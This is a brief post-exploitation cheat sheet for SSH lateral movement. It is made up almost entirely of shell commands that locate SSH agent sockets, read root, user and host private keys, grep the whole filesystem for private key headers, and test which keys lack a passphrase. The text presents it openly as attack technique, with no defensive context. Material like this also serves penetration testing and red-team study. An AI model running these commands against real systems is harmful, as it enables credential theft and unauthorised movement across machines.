# SSH-Based Lateral Movement
# 1. SSH Agent Sockets
```
find /tmp -path "*/ssh-*" -name "agent.*" 2>/dev/null
# Or via /proc:
grep -r SSH_AUTH_SOCK /proc/*/environ 2>/dev/null | tr '\0' '\n'

# Typical path: /tmp/ssh-XXXXXX/agent.PID
```
# 2. SSH Keys and More 
```
/home/*
cat /root/.ssh/authorized\_keys 
cat /root/.ssh/identity.pub 
cat /root/.ssh/identity 
cat /root/.ssh/id\_rsa.pub 
cat /root/.ssh/id\_rsa 
cat /root/.ssh/id\_dsa.pub 
cat /root/.ssh/id\_dsa 
cat /etc/ssh/ssh\_config 
cat /etc/ssh/sshd\_config 
cat /etc/ssh/ssh\_host\_dsa\_key.pub 
cat /etc/ssh/ssh\_host\_dsa\_key 
cat /etc/ssh/ssh\_host\_rsa\_key.pub 
cat /etc/ssh/ssh\_host\_rsa\_key 
cat /etc/ssh/ssh\_host\_key.pub 
cat /etc/ssh/ssh\_host\_key
cat ~/.ssh/authorized\_keys 
cat ~/.ssh/identity.pub 
cat ~/.ssh/identity 
cat ~/.ssh/id\_rsa.pub 
cat ~/.ssh/id\_rsa 
cat ~/.ssh/id\_dsa.pub 
cat ~/.ssh/id\_dsa 
 
grep -ir "-----BEGIN RSA PRIVATE KEY-----" /home/*
grep -ir "BEGIN DSA PRIVATE KEY" /home/*

grep -ir "BEGIN RSA PRIVATE KEY" /*
grep -ir "BEGIN DSA PRIVATE KEY" /

```
# 3. More key enumeration
```
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.key" 2>/dev/null
*Also: /etc/ssh/ssh_host_*_key (MITM), /home/*/.ssh/id_*

```

**Find keys without passphrase:**
```
for key in $(find / -name "id_*" ! -name "*.pub" 2>/dev/null); do
    ssh-keygen -y -P "" -f "$key" > /dev/null 2>&1 && echo "NO PASSPHRASE: $key"
done
```
